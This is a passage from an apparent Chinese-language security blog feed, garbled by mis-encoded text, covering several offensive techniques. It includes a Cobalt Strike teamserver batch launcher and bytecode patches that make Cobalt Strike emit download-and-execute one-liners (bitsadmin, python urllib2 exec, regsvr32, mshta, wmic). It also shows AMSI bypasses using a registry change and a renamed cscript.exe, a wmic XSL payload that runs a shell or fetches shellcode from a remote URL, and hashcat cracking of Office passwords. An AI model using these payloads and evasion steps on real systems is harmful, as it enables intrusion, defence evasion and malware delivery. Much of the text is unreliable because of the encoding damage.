    <title><![CDATA[CS teamserver.bat]]></title>
    <url>%2Farchives%2Fteamserver.html</url>
    <content type="text"><![CDATA[CSçš„teamserverç»å¸¸æ˜¯åœ¨linuxæœåŠ¡å™¨ä¸Šè·‘çš„ï¼Œæœ‰å°ä¼™ä¼´é—®åœ¨win serverä¸Šæ€ä¹ˆè·‘ï¼Œæ‰€ä»¥å¼„äº†ä¸€ä¸ªæ‰¹å¤„ç†ï¼Œéœ€è¦çš„çœ‹ç€æ”¹æ”¹ï¼Œwinä¸Šé¢éœ€è¦è£…java JDK,winä¸Šé»˜è®¤æ²¡æœ‰keytool,æ‰€ä»¥éœ€è¦è‡ªå·±å»ç”Ÿæˆä¸€ä¸ªcobaltstrike.store ~123456789101112131415161718192021222324252627282930313233343536373839404142434445464748@echo off :check_java java -version &gt;nul 2&gt;&amp;1 if %errorLevel% == 0 ( goto:check_permissions ) else ( echo [-] is Java installed? goto:eof ) :check_permissions echo [+] Administrative permissions required. Detecting permissions... set TempFile_Name=%SystemRoot%\System32\BatTestUACin_SysRt%Random%.batemp (echo "BAT Test UAC in Temp" &gt;%TempFile_Name% ) 1&gt;nul 2&gt;nul if exist %TempFile_Name% ( echo [+] Success: Administrative permissions confirmed. del %TempFile_Name% 1&gt;nul 2&gt;nul goto:check_certificate ) else ( echo [-] Failure: Current permissions inadequate. goto:eof ):check_certificate set certificate=".\cobaltstrike.store" if exist %certificate% ( goto:test_arguments ) else ( echo [!] Please generate the cobaltstrike.store ! echo [!] Example: keytool -keystore ./cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias cobaltstrike -dname "CN=Major Cobalt Strike, OU=AdvancedPenTesting, O=cobaltstrike, L=Somewhere, S=Cyberspace, C=Earth" goto:eof ) :test_arguments set argC=0 for %%x in (%*) do Set /A argC+=1 if %argC% LSS 2 ( echo [-] teamserver ^&lt;host^&gt; ^&lt;password^&gt; [/path/to/c2.profile] [YYYY-MM-DD] echo ^&lt;host^&gt; is the default IP address of this Cobalt Strike team server echo ^&lt;password^&gt; is the shared password to connect to this server echo [/path/to/c2.profile] is your Malleable C2 profile echo [YYYY-MM-DD] is a kill date for Beacon payloads run from this server goto:eof ) else ( goto:run_cobal ):run_cobal java -XX:ParallelGCThreads=4 -Dcobaltstrike.server_port=50050 -Djavax.net.ssl.keyStore=./cobaltstrike.store -Djavax.net.ssl.keyStorePassword=123456 -server -XX:+AggressiveHeap -XX:+UseParallelGC -classpath ./cobaltstrike.jar server.TeamServer %*]]></content>
      <categories>
        <category>å·¥å…·æ”¶é›†</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Cobal Strike è‡ªå®šä¹‰OneLiner]]></title>
    <url>%2Farchives%2FCustom_Oneliner.html</url>
    <content type="text"><![CDATA[0x00 èµ·å› åœ¨ä½¿ç”¨Cobal Strikeçš„è¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°é‡Œé¢å·²ç»é›†æˆäº†å‡ ç§ Script Web Deliveryï¼Œå¦‚ä¸‹å›¾ï¼š è€Œä¸”åœ¨ç”Ÿæˆä»¥åæ‰“å¼€site,åªéœ€è¦ç‚¹å‡»Copy URLå°±å¯ä»¥æŠŠå‘½ä»¤å¤åˆ¶å‡ºæ¥ï¼Œå†å†™aggressorè„šæœ¬æ—¶ä¹Ÿæƒ³è¦å®ç°è¿™ä¸ªåŠŸèƒ½ï¼Œå‘ç°copyä»¥ååªæœ‰urlï¼Œå¹¶æ²¡æœ‰å‘½ä»¤ï¼Œæ‰€ä»¥ä¸ºäº†ä¸€æ¢ç©¶ç«Ÿï¼Œè¿˜æ˜¯æŠŠCSè§£å‹ï¼Œgrepäº†ä¸€æŠŠï¼Œå®šä½åˆ°common.CommonUtilsï¼Œå‘ç°äº†OneLineræ–¹æ³•ï¼š æ‰€ä»¥è¦å®ç°è¿™ä¸ªåŠŸèƒ½æˆ‘ä»¬å°±éœ€è¦å¯¹è¿™ä¸ªclassè¿›è¡Œä¿®æ”¹ï¼Œå¢åŠ æˆ‘ä»¬æƒ³è¦çš„å‘½ä»¤ã€‚ 0x01 ä½¿ç”¨javassistä¿®æ”¹classJavassistæ˜¯ä¸€ä¸ªèƒ½å¤Ÿæ“ä½œå­—èŠ‚ç æ¡†æ¶ï¼Œé€šè¿‡å®ƒæˆ‘ä»¬èƒ½å¾ˆè½»æ˜“çš„ä¿®æ”¹classä»£ç ã€‚é¦–å…ˆä¸‹è½½javassist ï¼Œæ–°å»ºä¸€ä¸ªjavaå·¥ç¨‹ï¼Œå³é”®å·¥ç¨‹å¯¼å…¥javassiståŒ…ã€‚ æˆ‘ä»¬å¯èƒ½å¸¸ç”¨mshta http://host/test.png çš„æ–¹å¼æ¥è¯·æ±‚payloadï¼Œå¯ä»¥ä½¿ç”¨ä¸€ä¸‹ä»£ç è¿›è¡Œæ·»åŠ ï¼š1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package changeclass;import java.io.IOException;import javassist.CannotCompileException;import javassist.ClassPool;import javassist.CtClass;import javassist.CtMethod;import javassist.NotFoundException;public class change &#123; public static void main(String[] args) &#123; updateMethod(); &#125; public static void updateMethod()&#123; try &#123; ClassPool cPool = new ClassPool(true); //å¦‚æœè¯¥æ–‡ä»¶å¼•å…¥äº†å…¶å®ƒç±»ï¼Œéœ€è¦åˆ©ç”¨ç±»ä¼¼å¦‚ä¸‹æ–¹å¼å£°æ˜ //cPool.importPackage("java.util.List"); //è®¾ç½®cobaltstrike.jaræ–‡ä»¶çš„ä½ç½® cPool.insertClassPath("/tmp/cobaltstrike.jar"); //è·å–è¯¥è¦ä¿®æ”¹çš„classå¯¹è±¡ CtClass cClass = cPool.get("common.CommonUtils"); //è·å–åˆ°å¯¹åº”çš„æ–¹æ³• CtMethod cMethod = cClass.getDeclaredMethod("OneLiner"); //æ›´æ”¹è¯¥æ–¹æ³•çš„å†…éƒ¨å®ç° //éœ€è¦æ³¨æ„çš„æ˜¯å¯¹äºå‚æ•°çš„å¼•ç”¨è¦ä»¥$å¼€å§‹ï¼Œä¸èƒ½ç›´æ¥è¾“å…¥å‚æ•°åç§° cMethod.setBody("&#123; if (\"bitsadmin\".equals($2)) &#123;" + "String f = garbage(\"temp\");" + "return \"cmd.exe /c bitsadmin /transfer \" + f + \" \" + $1 + \" %APPDATA%\\\\\" + f + \".exe&amp;%APPDATA%\\\\\" + f + \".exe&amp;del %APPDATA%\\\\\" + f + \".exe\";&#125;" + "if (\"powershell\".equals($2)) &#123;" + "return PowerShellOneLiner($1);&#125;" + "if (\"python\".equals($2)) &#123;" + "return \"python -c \\\"import urllib2; exec urllib2.urlopen('\" + $1 + \"').read();\\\"\";&#125;" + "if (\"regsvr32\".equals($2)) &#123;" + "return \"regsvr32 /s /n /u /i:\" + $1 + \" scrobj.dll\";&#125;" + "if (\"mshta\".equals($2)) &#123;" + "return \"mshta \" + $1;&#125;" + "if (\"wmic\".equals($2)) &#123;" + " return \"wmic os get /format:\\\"\" + $1 + \"\\\"\";&#125;" + "print_error(\"'\" + $2 + \"' for URL '\" + $1 + \"' does not have a one-liner\");" + "throw new RuntimeException(\"'\" + $2 + \"' for URL '\" + $1 + \"' does not have a one-liner\");&#125;"); //ä¿®æ”¹ä»¥åè¾“å‡ºç›®å½• cClass.writeFile("/tmp/"); System.out.println("=======ä¿®æ”¹æ–¹æ³•å®Œ========="); &#125; catch (NotFoundException e) &#123; e.printStackTrace(); &#125; catch (CannotCompileException e) &#123; e.printStackTrace(); &#125; catch (IOException e) &#123; e.printStackTrace(); &#125; &#125;&#125; åœ¨è¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œæ–¹æ³• OneLiner(String url, String type)æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œæ–¹æ³•ä¸­çš„å‚æ•°ä» $1 å¼€å§‹ï¼Œè‹¥è¯¥æ–¹æ³•ä¸ºé static æ–¹æ³•ï¼Œå¯ä»¥ç”¨ $0 æ¥è¡¨ç¤ºè¯¥æ–¹æ³•å®ä¾‹è‡ªèº«ï¼Œè‹¥è¯¥æ–¹æ³•ä¸º static æ–¹æ³•ï¼Œåˆ™ $0 ä¸å¯ç”¨ã€‚è€Œä¸”å†™çš„ä»£ç éœ€è¦å°†&quot;, \ è¿›è¡Œè½¬ä¹‰ã€‚ è¿è¡Œæ­¤ä»£ç ï¼Œå¯æˆåŠŸç”Ÿæˆä¸€ä¸ªæ–°çš„class: å°†æ­¤classæ›¿æ¢CSä¸­çš„classå°±å¥½äº†ã€‚ ä½¿ç”¨çš„æ—¶å€™åªéœ€è¦åœ¨aggressorä¸­site_hostä¸­æŒ‡å®šå³å¯ï¼Œä¾‹å¦‚ä½¿ç”¨wmic1site_host(%options["host"], %options["port"], %options["uri"], $data, "text/plain", "Scripted Web Delivery (wmic)"); ä½¿ç”¨mshta1site_host(%options["host"], %options["port"], %options["htauri"], $htadata, "application/hta", "Scripted Web Delivery (mshta)"); æ•ˆæœå¦‚ä¸‹ï¼š å·²ç»ç¼–è¯‘å¥½çš„classå¯ä»¥ä»è¿™é‡Œä¸‹è½½ï¼š GIT : CS_Chinese_support]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DotNetToJScript å¤æ´»ä¹‹è·¯]]></title>
    <url>%2Farchives%2FAMSI_bypass.html</url>
    <content type="text"><![CDATA[0x00 ç®€ä»‹å»å¹´James Forshawå¼€æºäº†ä¸€ä¸ªå·¥å…·DotNetToJScriptï¼Œèƒ½å¤Ÿåˆ©ç”¨JSã€Vbsç­‰è„šæœ¬åŠ è½½.Netç¨‹åºã€‚å†æ­¤å·¥å…·å‘å¸ƒä»¥åï¼Œå¾ˆå¤šå¾ˆå¤šçš„å·¥å…·ä¹Ÿåœ¨æ­¤åŸºç¡€ä¸Šäº§ç”Ÿï¼Œæ¯”å¦‚StarFightersã€CACTUSTORCHã€SharpShooterç­‰ç­‰ï¼ŒåŸºäºè„šæœ¬çš„æ”»å‡»ä¹Ÿéšä¹‹è¶Šæ¥è¶Šå¤šï¼Œæ‰€ä»¥åœ¨win10ä¸­ï¼Œå¾®è½¯å¼•å…¥äº†AMSIï¼Œå¹¶å°†åŸºäºDotNetToJScriptçš„è„šæœ¬ç‰¹å¾åŠ å…¥åˆ°æ£€æµ‹ä¹‹åˆ—ã€‚å¹¶å°†æ­¤å·¥å…·æ ‡è®°ä¸ºæ¶æ„è½¯ä»¶ã€‚å¦‚æœç›´æ¥è¿è¡Œé€šè¿‡DotNetToJScriptç”Ÿæˆçš„è„šæœ¬ï¼Œä¾¿ä¼šç›´æ¥æ‹¦æˆªï¼Œå¦‚ä¸‹å›¾æœ€è¿‘ï¼Œå­¦åˆ°äº†ä¸¤ç§bypassçš„æ–¹å¼ï¼Œæ‰€ä»¥è¿›è¡Œä¸€ä¸‹åˆ†äº«ã€‚ 0x01 ç¦ç”¨AMSIè¿™é‡Œè®²çš„ç¦ç”¨AMSIå¹¶ä¸éœ€è¦é«˜æƒé™ï¼Œåªéœ€è¦ä¸€ä¸ªç®€å•çš„Trick,è¿™ä¸ªæ˜¯ä»è¿™ç¯‡æ–‡ç« å­¦æ¥çš„ï¼Œé€šè¿‡Process Monitor è¿›è¡ŒæŸ¥çœ‹ï¼Œè®¾ç½®ä»¥ä¸‹è¿‡æ»¤å™¨ï¼šè¿è¡Œé€šè¿‡DotNetToJScriptç”Ÿæˆçš„è„šæœ¬ï¼Œå¯ä»¥ç›‘æ§åˆ°ä»¥ä¸‹è°ƒç”¨è¿‡ç¨‹ï¼šè¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œåœ¨åŠ è½½AMSIä¹‹å‰ï¼ŒæŸ¥è¯¢äº†ä»¥ä¸‹æ³¨å†Œè¡¨é”®å€¼HKCU\Software\Microsoft\Windows Script\Settings\AmsiEnable,å°è¯•ä¿®æ”¹æ­¤é”®å€¼ä¸º0ï¼šå†æ¬¡è¿è¡Œè„šæœ¬ï¼Œå¯ä»¥çœ‹åˆ°shellcodeæˆåŠŸæ‰§è¡Œäº†ï¼Œå¦‚ä¸‹å›¾ï¼šè™½ç„¶ä¿®æ”¹æ³¨å†Œè¡¨å¯ä»¥å®ç°ç¦ç”¨AMSIï¼Œä½†æ˜¯éœ€è¦é«˜æƒé™ï¼Œé‚£æ€æ ·æ‰å¯ä»¥åœ¨æ™®é€šæƒé™ä¸‹ç¦ç”¨AMSIï¼Œå…¶å®é€šè¿‡@tiraniddoçš„æ–‡ç« æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œå…¶å®å¯ä»¥é€šè¿‡DLLåŠ«æŒæ¥è¿›è¡Œç»•è¿‡ã€‚é€šè¿‡Process Monitorå¯ä»¥çœ‹åˆ°æ£€æµ‹è¿‡ç¨‹ä¸­è°ƒç”¨äº†C:\Windows\System32\amsi.dll,å¦‚æœæˆ‘ä»¬æŠŠcscript.exe é‡å‘½åæˆamsi.dllä¼šæ€ä¹ˆæ ·å‘¢ï¼Ÿ12copy c:\windows\system32\cscript.exe amsi.dllamsi.dll evil.js å¯ä»¥çœ‹åˆ°æˆåŠŸshellcode æˆåŠŸæ‰§è¡Œäº†ï¼Œä¿®æ”¹è¿‡æ»¤å™¨å¦‚ä¸‹ï¼šæˆ‘ä»¬æ¥çœ‹ä¸€ä¸‹è°ƒç”¨è¿‡ç¨‹å¯ä»¥çœ‹åˆ°ï¼Œç°åœ¨å·²ç»æ²¡æœ‰è°ƒç”¨C:\Windows\System32\amsi.dll,è¿™ä¹Ÿå°±è®©æˆ‘ä»¬æˆåŠŸæ‰§è¡Œäº†æˆ‘ä»¬çš„shellcodeã€‚ 0x02 åˆ©ç”¨wmicCasey Smith@subTeeåœ¨åšå®¢åˆ†äº«çš„ä¸€ä¸ªæŠ€å·§ï¼Œä½¿ç”¨wmicèƒ½å¤Ÿä»æœ¬åœ°æˆ–ä»URLè°ƒç”¨XSLï¼ˆå¯æ‰©å±•æ ·å¼è¡¨è¯­è¨€ï¼‰è„šæœ¬ã€‚ç»è¿‡æµ‹è¯•ï¼Œé€šè¿‡æ­¤æ–¹å¼æ¥è°ƒç”¨DotNetToJScriptçš„è„šæœ¬ä¹Ÿæ˜¯å¯ä»¥æˆåŠŸæ‰§è¡Œçš„ã€‚subTeeçš„æ–‡ç« åœ¨è¿™ã€‚åˆ©ç”¨å‘½ä»¤å¦‚ä¸‹ï¼š1234#Local Filewmic process list /FORMAT:evil.xsl#Remote Filewmic os get /FORMAT:"https://example.com/evil.xsl" evil.xsl1234567891011&lt;?xml version='1.0'?&gt;&lt;stylesheetxmlns="http://www.w3.org/1999/XSL/Transform" xmlns:ms="urn:schemas-microsoft-com:xslt"xmlns:user="placeholder"version="1.0"&gt;&lt;output method="text"/&gt; &lt;ms:script implements-prefix="user" language="JScript"&gt; &lt;![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("cmd.exe"); ]]&gt; &lt;/ms:script&gt;&lt;/stylesheet&gt; ä¿®æ”¹å¥½çš„è„šæœ¬ï¼Œå¯ä»¥çœ‹è¿™é‡Œï¼šæˆ³æˆ‘ä½¿ç”¨ä¸€ä¸‹å‘½ä»¤åˆ™å¯æ‰§è¡Œshellcode1wmic os get /FORMAT:"https://raw.githubusercontent.com/Ridter/AMSI_bypass/master/shellcode.xsl" ä½†æ˜¯ä½¿ç”¨wmicæ‰§è¡Œçš„æ—¶å€™ä¼šæœ‰ä¸€ä¸ªé—®é¢˜ï¼Œåœ¨powershellä¸‹æ‰§è¡Œä¼šå¤±è´¥ã€‚å¦‚ä¸‹å›¾ï¼š é‚£ä¹ˆæ€ä¹ˆè°ƒç”¨å‘¢ï¼Ÿåœ¨è¯»äº†mdsecçš„è¿™ç¯‡æ–‡ç« ä»¥åï¼Œæˆ‘ä»¬å‘ç°ï¼Œå…¶å®æ˜¯å¯ä»¥é€šè¿‡COMæ¥è°ƒç”¨çš„ã€‚ç”¨javascriptå†™å¯ä»¥è¿™æ ·ï¼š123456var xml = new ActiveXObject("Microsoft.XMLDOM");xml.async = false;var xsl = xml;xsl.load("http://host/a.xsl");xml.transformNode(xsl);self.close(); GIT : AMSI_bypass ä½¿ç”¨å¦‚ä¸‹å›¾ï¼š 0x03å‚è€ƒhttps://tyranidslair.blogspot.com/2018/06/disabling-amsi-in-jscript-with-one.htmlhttps://subt0x11.blogspot.ca/2018/04/wmicexe-whitelisting-bypass-hacking.html?m=1https://www.mdsec.co.uk/2018/06/freestyling-with-sharpshooter-v1-0/]]></content>
      <categories>
        <category>å¥‡æŠ€æ·«å·§</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ä½¿ç”¨hashcatç ´è§£åŠ å¯†officeæ–‡ä»¶]]></title>
    <url>%2Farchives%2Fhashcat_crack_office.html</url>
    <content type="text"><![CDATA[é¦–å…ˆè¦ä¸‹è½½ office2john.pyï¼Œæ”¯æŒç ´è§£çš„åŠ å¯†ä¸ºofficeè‡ªå¸¦çš„åŠ å¯†åŠŸèƒ½ï¼Œå³ï¼šä½¿ç”¨office2johnå°†officeè½¬æ¢ä¸ºhashï¼š1python office2john.py 123.docx &gt; hash.txt ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œåˆ‡å‰²ï¼Œè½¬æ¢æˆhashcatæ”¯æŒçš„å½¢å¼ï¼š1awk -F ":" '&#123;print $2&#125;' hash.txt &gt; hashhc.txt ä½¿ç”¨hashcatè¿›è¡Œç ´è§£ï¼š1hashcat -m 9500 hashhc.txt ~/wordlist/passwd.txt -o out.txt è¿™é‡Œæˆ‘ä½¿ç”¨äº†office2010ï¼Œæ‰€ä»¥é€‰æ‹©9500ï¼Œè¦æ ¹æ®å¯¹åº”ç‰ˆæœ¬æ¥é€‰æ‹© é€‰æ‹©ç‰ˆæœ¬å¯ä»¥ä½¿ç”¨ hashcat â€“help æ¥æŸ¥çœ‹ç ´è§£æˆåŠŸå¦‚ä¸‹ï¼š]]></content>
  </entry>
  <entry>
    <title><![CDATA[Cobalt strike3.8 ä¸­æ–‡æ”¯æŒ(Update)]]></title>
    <url>%2Farchives%2FCS3_8_chinese_support.html</url>
    <content type="text"><![CDATA[0x00 ç®€ä»‹cobaltstrike3.10 å·²ç»å‡ºæ¥å¾ˆä¹…äº†ï¼Œå…¶ä¸­æœ€å¸å¼•äººçš„å¯èƒ½å°±æ˜¯ä»–å·²ç»æ”¯æŒä¸­æ–‡äº†ï¼Œä½†æ˜¯è²Œä¼¼å¾ˆä¹…ä»¥æ¥éƒ½æ²¡åœ¨ç½‘ä¸Šçœ‹åˆ°3.10çš„èµ„æºï¼Œæ‰€ä»¥å°±æ²¡åŠæ³•ï¼Œæ‹¿æ‰‹ä¸Šçš„3.8 æ”¹æ”¹å°†å°±ç”¨ã€‚ 0x01 åç¼–è¯‘é¦–å…ˆæˆ‘ä»¬è¦å¯¹cobaltstrike3.8è¿›è¡Œåç¼–è¯‘ï¼Œè¿™é‡Œå¯ä»¥å‚ç…§ä¹‹å‰ç ´è§£çš„æ–¹æ³•ï¼Œæˆ³æˆ‘,ä½¿ç”¨jadè¿›è¡Œåç¼–è¯‘ã€‚ 0x02 ä¿®æ”¹ä»£ç è¦æ€ä¹ˆå®šä½åˆ°è¦æ”¹å“ªé‡Œå‘¢ï¼Ÿæˆ‘ä»¬å¯ä»¥çœ‹ä¸€ä¸‹CSçš„è¾“å‡ºï¼š å¯ä»¥çœ‹åˆ°åœ¨è¾“å‡ºä¹‹å‰æœ‰received output,æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥æ£€ç´¢è¿™ä¸ªå…³é”®å­—ï¼Œé©¬ä¸Šå¯ä»¥å®šä½åˆ°BeaconC2.classæ–‡ä»¶ï¼Œæœç´¢â€œreceived outputâ€ä¸€å…±æœ‰5ä¸ªç»“æœï¼š æŸ¥çœ‹ä»£ç å¦‚ä¸‹ï¼š å¯ä»¥çœ‹åˆ°ï¼Œè¾“å‡ºçš„ç»“æœæ˜¯ç”±CommonUtilsç±»çš„bStringæ–¹æ³•è¿”å›çš„ï¼Œå®šä½åˆ°CommonUtils.classæ–‡ä»¶æŸ¥çœ‹ä»£ç ï¼š å¯ä»¥çœ‹åˆ°ä¼ è¿‡æ¥çš„æ•°æ®ä½¿ç”¨ ISO8859-1 è¿›è¡Œäº†ç¼–ç ã€‚ISO8859-1å±äºå•å­—èŠ‚ç¼–ç ï¼Œæœ€å¤šèƒ½è¡¨ç¤ºçš„å­—ç¬¦èŒƒå›´æ˜¯0-255ï¼Œåº”ç”¨äºè‹±æ–‡ç³»åˆ—ã€‚æ¯”å¦‚ï¼Œå­—æ¯açš„ç¼–ç ä¸º0x61=97ã€‚ å¾ˆæ˜æ˜¾ï¼Œ ISO8859-1 ç¼–ç è¡¨ç¤ºçš„å­—ç¬¦èŒƒå›´å¾ˆçª„ï¼Œæ— æ³•è¡¨ç¤ºä¸­æ–‡å­—ç¬¦ã€‚è¿™å°±æ˜¯CSæ— æ³•æ˜¾ç¤ºä¸­æ–‡çš„åŸå› ã€‚ç»è¿‡æµ‹è¯•ï¼Œä½¿ç”¨ ISO8859-1 è¿›è¡Œä¸­é—´ç¼–ç æ˜¯ä¸ä¼šå¯¼è‡´æ•°æ®ä¸¢å¤±çš„ã€‚é‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥ä¿®æ”¹ä»£ç æŠŠç¼–ç è½¬è¿‡æ¥æ¥å‘¢ï¼Ÿå½“ç„¶å¯ä»¥ ï¼ ä½†æ˜¯ç”±äºè‡ªå·±æ¯”è¾ƒèœï¼Œç›´æ¥ä¿®æ”¹CommonUtils.javaä»¥åç¼–è¯‘ä¸è¿‡å»ï¼ˆè¡¨ç¤ºå¾ˆéš¾å—ï¼Œå¦‚æœä½ ä¼šç¼–è¯‘ï¼Œè¿˜å¸Œæœ›ä¸åèµæ•™ï¼‰ã€‚æ‰€ä»¥åªèƒ½å»ä¿®æ”¹BeaconC2.javaã€‚ ç»è¿‡å¤šæ¬¡æµ‹è¯•ï¼Œå‘ç°åœ¨CSä¸Šæ‰§è¡Œå‘½ä»¤ä»¥åè¿”å›çš„ç»“æœç¼–ç ä¸ºGBKï¼Œæ‰€ä»¥è½¬ç è¿‡ç¨‹ä¸ºCommonUtils.javaè½¬ç ï¼š1GBK -&gt; ISO8859-1 æˆ‘ä»¬è¦ä¿®æ”¹çš„BeaconC2.1ISO8859-1 -&gt; GBK -&gt; UTF-8 æ‰€ä»¥æ€è·¯å°±å¾ˆæ˜æœ—äº†ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨ä¼ å…¥restä¹‹å‰æŠŠä¸­æ–‡è½¬æ¢æˆUTF-8å°±å¯ä»¥äº†ï¼Œä»£ç ä¹Ÿå¾ˆç®€å•ï¼Œæµ‹è¯•å¦‚ä¸‹ï¼š æ‰€ä»¥å…³é”®ä»£ç ä¸ºï¼š123String tmp = CommonUtils.bString(CommonUtils.readAll(in));String tmp1 = new String(tmp.getBytes("ISO8859-1"),"gbk");String rest = new String(tmp1.getBytes(),"utf-8"); æºä»£ç æ˜¯è¿™æ ·ï¼š ä¿®æ”¹ä»¥åæ˜¯è¿™æ ·ï¼š æ‰€ä»¥æ‰¾åˆ°æ‰€æœ‰çš„:1String rest = CommonUtils.bString(CommonUtils.readAll(in)); æ›¿æ¢å³å¯ã€‚ 0x03 ç¼–è¯‘æ›¿æ¢ä¿®æ”¹ä»¥åï¼Œéœ€è¦æŠŠBeaconC2.javaç¼–è¯‘ä¹‹åæ›¿æ¢åŸæ¥çš„BeaconC2.classã€‚ç¼–è¯‘æ–¹æ³•å¾ˆç®€å•ï¼Œåªéœ€è¦æŠŠBeaconC2.javaæ”¾åˆ°è§£å‹ä»¥åçš„CSç›®å½•ï¼Œæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š1javac -classpath . BeaconC2.java -Xlint:unchecked åœ¨è¿™é‡Œï¼Œå¯èƒ½ä¼šç¢°åˆ°ä»¥ä¸‹æŠ¥é”™ è¿™é‡Œå¯ä»¥æ”¹ä¸€ä¸‹ä»£ç ï¼Œå°†12import c2profile.MalleableHook.MyHook;import dns.DNSServer.Handler; æ”¹ä¸ºï¼š12import c2profile.MalleableHook;import dns.DNSServer; åœ¨è¿›è¡Œç¼–è¯‘å³å¯ã€‚ä¹‹åå°†åŸæ¥çš„BeaconC2.classæ›¿æ¢ï¼Œæˆ‘ä»¬çš„CSå°±ä¿®æ”¹å®Œæˆäº†ã€‚ 0x04 æ•ˆæœè¿™é‡Œå½•äº†ä¸€ä¸ªDEMO: 0x05 çº é”™ç»è¿‡å°ä¼™ä¼´çš„åé¦ˆä»¥åŠæˆ‘è‡ªå·±çš„æµ‹è¯•ï¼Œå‘ç°è¿™ä¹ˆç²—æš´çš„æ”¹æ˜¯æœ‰é—®é¢˜çš„ï¼Œå¦‚æœæŠŠæ‰€æœ‰è¾“å‡ºçš„ç¼–ç éƒ½æ”¹äº†ï¼Œä¼šä½¿å¾—ç¨‹åºæµç¨‹èµ°ä¸é€šï¼Œéƒ¨åˆ†åŠŸèƒ½ä¸èƒ½ä½¿ç”¨ï¼Œæ‰€ä»¥è¿˜æ˜¯è¦é’ˆå¯¹æ€§çš„ä¿®æ”¹ã€‚ä¹Ÿå°±æ˜¯åœ¨BeaconC2.class ä¸­ä¿®æ”¹æƒ³è¦çš„è¾“å‡ºéƒ¨åˆ†ï¼Œé¦–å…ˆï¼Œæ£€ç´¢received output, æŠŠå…¶å¯¹åº”çš„1String rest = CommonUtils.bString(CommonUtils.readAll(in)); æ›¿æ¢ï¼Œä¹‹åç»è¿‡æµ‹è¯• type == 22 æ˜¯å›æ˜¾æ–‡ä»¶åˆ—è¡¨çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦ä¿®æ”¹è¿™éƒ¨åˆ†å°±å¥½äº†ã€‚å¦‚ä¸‹å›¾ï¼š è¿™æ ·å°±ä¸ä¼šé€ æˆç¨‹åºå…¶ä»–åŠŸèƒ½ä¸Šçš„é”™è¯¯äº†ã€‚å…³äºä¸Šä¼ ï¼Œä¸‹è½½ï¼Œæ‰§è¡Œç­‰ï¼Œéƒ½å†™åœ¨TaskBeacon.class é‡Œé¢ï¼Œå¯ä»¥é’ˆå¯¹æ€§å¯¹å…¶ç¼–ç è¿›è¡Œä¿®æ”¹ã€‚è¿™é‡Œå°±ä¸è¯¦ç»†è¯´æ˜äº†ï¼Œæœ‰å…´è¶£çš„å¯ä»¥è‡ªå·±å»è¯»ä¸€ä¸‹ä»£ç ï¼Œå…³äºæ–‡ä»¶æµè§ˆï¼Œæˆ‘ä»¬å¯ä»¥å®šä½åˆ°aggressor/windows/FileBrowser.class,å…¶åŒå‡»äº‹ä»¶ä»£ç å¦‚ä¸‹ï¼š è°ƒç”¨äº†ls æ–¹æ³•ï¼š ls æ–¹æ³•è°ƒç”¨äº† beacons.task_ls,å¿«é€Ÿå®šä½åˆ°server/Beacons.class, ç”±äºåŒå‡»äº‹ä»¶æ˜¯å–å¾—è¿”å›è½¬ç ä»¥åçš„æ–‡å­—ï¼Œæ‰€ä»¥è¦è®©åŠŸèƒ½æ­£å¸¸ä½¿ç”¨ï¼Œæˆ‘ä»¬éœ€è¦å†å°†ç¼–ç è½¬å›å»ï¼Œä¿®æ”¹å¦‚ä¸‹ï¼š è¿™æ ·å°±å¯ä»¥æ­£å¸¸ä½¿ç”¨æ–‡ä»¶æµè§ˆåŠŸèƒ½äº†ï¼Œä»¥ä¸Šæ›¿æ¢çš„classæ–‡ä»¶å·²ç»æ¨åˆ°äº†githubï¼Œæ¬¢è¿å°ä¼™ä¼´ä¸€èµ·æ¥ä¿®æ”¹bug~ GIT : CS_Chinese_support]]></content>
      <categories>
        <category>å·¥å…·æ”¶é›†</category>
      </categories>
      <tags>
        <tag>cobaltstrike</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Hack with rewrite]]></title>
    <url>%2Farchives%2Fhack_with_rewrite.html</url>
    <content type="text"><![CDATA[0x00 ç®€ä»‹å¤§å®¶éƒ½çŸ¥é“apacheï¼Œnginxç­‰æœ‰rewriteçš„åŠŸèƒ½ï¼Œé€šè¿‡rewriteè§„åˆ™å¯ä»¥æŠŠè¾“å…¥çš„URLè½¬æ¢æˆå¦ä¸€ä¸ªURLï¼Œè¿™æ˜¯æˆ‘ä»¬å¸¸è§çš„ä¸€ç§éœ€æ±‚ï¼Œå¯ä»¥è®©æˆ‘ä»¬çš„urlå˜å¾—æ›´åŠ ç®€æ´ã€‚ä½†æ˜¯å…¶å®è¿™ä¸ªåŠŸèƒ½ä¹Ÿå¯è¢«ç”¨äºä¸€äº›åˆ«çš„ç›®çš„ã€‚ä¸‹é¢å°±ç®€å•çš„ä»‹ç»ä¸€ä¸‹ã€‚ 0x01 åé—¨å…³äºé€šè¿‡é…ç½®æ–‡ä»¶åšåé—¨å·²ç»æœ‰å¾ˆå¤šæ–‡ç« æœ‰äº†ä»‹ç»ï¼Œå³.htaccesså’Œ.user.iniæ–‡ä»¶æ„é€ åé—¨ï¼Œå…³äº.htaccessåé—¨å¯ä»¥çœ‹è¿™é‡Œ,user.iniåé—¨Pç‰›ä¹Ÿå‘è¿‡ä¸€ç¯‡æ–‡ç« ï¼Œå¯ä»¥çœ‹è¿™é‡Œ,å½“ç„¶è¿˜æœ‰æŸ 